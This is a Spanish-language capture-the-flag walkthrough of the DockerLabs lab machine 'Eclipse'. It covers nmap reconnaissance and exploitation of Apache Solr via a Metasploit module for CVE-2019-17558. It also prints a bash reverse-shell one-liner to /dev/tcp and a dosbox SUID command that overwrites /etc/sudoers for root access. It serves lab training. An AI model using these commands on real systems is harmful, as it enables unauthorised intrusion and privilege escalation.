Maquina **Eclipse** de [DockerLabs](https://dockerlabs.es)

Autor: [Xerosec](https://www.youtube.com/c/xerosec)

Dificultad: Medio

![Eclipse](./images/eclipse/img/eclipse.png)

# Reconocimiento

Comenzamos con un escaneo de `nmap`:

```css
nmap -sS -sV -sC --open --min-rate 5000 -n -Pn -p- -vvv 172.17.0.2 -oN escaneo.txt
```

```ruby
# Nmap 7.95 scan initiated Wed Dec 18 00:26:02 2024 as: nmap -sS -sV -sC --open --min-rate 5000 -n -Pn -p- -vvv -oN escaneo.txt 172.17.0.2
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.000014s latency).
Scanned at 2024-12-18 00:26:03 -03 for 13s
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE REASON         VERSION
80/tcp   open  http    syn-ack ttl 64 Apache httpd 2.4.59 ((Debian))
|_http-title: Epic Battle
|_http-server-header: Apache/2.4.59 (Debian)
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
8983/tcp open  http    syn-ack ttl 64 Apache Solr
|_http-favicon: Unknown favicon MD5: ED7D5C39C69262F4BA95418D4F909B10
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-title: Solr Admin
|_Requested resource was http://172.17.0.2:8983/solr/
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Dec 18 00:26:16 2024 -- 1 IP address (1 host up) scanned in 13.35 seconds
```

Como vemos hay 2 puertos abiertos:

•`Puerto 80: Apache httpd 2.4.59`

•`Puerto 8983: Apache Solr`

y estamos frente a un debian.

Luego de revisar el puerto 80, no encuentro nada interesante, por lo que pasaremos directamente al 8983.

Puerto 8983:

![Solr 8983](./images/eclipse/img/solr.png)

Como vemos tenemos un `solr 8.3.0`, la cual es vulnerable a un `RCE(Remote code execution)`.

# Intrusión

Luego de buscar, veo que hay un exploit de `metasploit`, por lo que continuaremos iniciandolo:

```css
msfconsole
```

luego buscamos el exploit:

```css
search CVE: 2019-17558
```

```css
use 0
```

una vez seleccionado el exploit, vamos a configurarlo:

```css
set RHOST 172.17.0.2
```

```css
set LHOST 172.17.0.1
```

y finalmente, ejecutamos el exploit:

```css
exploit
```

una vez nos sale el prompt "`meterpreter >`" ejecutamos `shell`, y ya estaremos dentro pero volveremos a enviarnos una shell ya que la de metasploit no es muy comoda.

Despues de ejecutar shell, escuchamos con netcat en el puerto 9090 (`nc -nlvp 9090`) y enviamos la siguiente shell:

```css
bash -c 'bash -i >& /dev/tcp/172.17.0.1/9090 0>&1'
```

Luego de que nos llegue la shell, realizamos el tratamiento de la tty y listo.

# Escalada De Privilegios

### Ninhack

Estando dentro, procedo a buscar binarios con el bit SUID activado:

```css
find / -perm -4000 2>/dev/null
```

![SUID](./images/eclipse/img/suid.png)

al parecer el binario `dosbox` tiene activado el SUID, y este nos permite modificar archivos del sistema, por lo que lo utilizaremos para modificar el sudoers. Para esto ejecutaremos lo siguiente

```css
dosbox -c 'mount c /' -c "echo ninhack ALL=(ALL:ALL) NOPASSWD: ALL >c:/etc/sudoers" -c exit
```

y listo, ya podremos ejecutar cualquier binario como root, por lo que para escalar debemos ejecutar `sudo su`.

### Root

![Root](./images/eclipse/img/root.png)

Gracias por leer :)